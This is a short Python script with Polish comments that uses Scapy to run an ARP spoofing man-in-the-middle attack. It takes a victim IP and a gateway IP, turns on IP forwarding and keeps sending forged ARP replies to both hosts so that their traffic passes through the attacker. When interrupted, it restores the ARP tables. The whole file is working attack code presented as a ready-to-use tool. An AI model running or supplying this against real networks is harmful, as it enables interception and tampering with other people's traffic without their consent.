from scapy.all import *
import os
import sys
import time
import pyfiglet

ascii_banner = pyfiglet.figlet_format("MITM_QPYTHON")
print(ascii_banner)

def get_mac(ip):
    """Pobiera adres MAC na podstawie IP"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered[0][1].hwsrc if answered else None

def spoof(target_ip, spoof_ip):
    """Wysyła fałszywe pakiety ARP do ofiary i bramy"""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Nie można uzyskać adresu MAC dla {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """Przywraca prawdziwe wpisy ARP"""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("[!] Użycie: python mitm.py <IP_ofiary> <IP_bramy>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # Włącza przekazywanie pakietów

    try:
        print("[+] Atak MITM rozpoczęty... (CTRL+C, aby zatrzymać)")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Przywracanie ARP... Proszę czekać.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[+] Atak zakończony.")

